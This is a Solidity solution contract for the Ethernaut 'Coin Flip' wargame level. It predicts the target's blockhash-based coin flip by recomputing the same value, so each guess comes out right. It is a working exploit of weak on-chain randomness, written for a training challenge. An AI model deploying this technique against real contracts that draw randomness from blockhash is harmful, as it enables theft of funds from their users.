// # Ethernaut 3: Coin Flip

pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

import "./03_CoinFlip.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;

    CoinFlip coinflip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event GuessIsRight();

    constructor (address instanceAddress) public {
        coinflip = CoinFlip(instanceAddress);
    }

    // To be able to always 'guess' right, we replicate what the `CoinFlip` instance
    // is doing to obtain the same pseudo-random value. Since our test expects an event
    // to confirm the guess was correct, `GuessIsRight` is emitted.
    function doFlip () public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        bool isGuessRight = coinflip.flip(side);
        if (isGuessRight) {
            emit GuessIsRight();
        }
    }
}
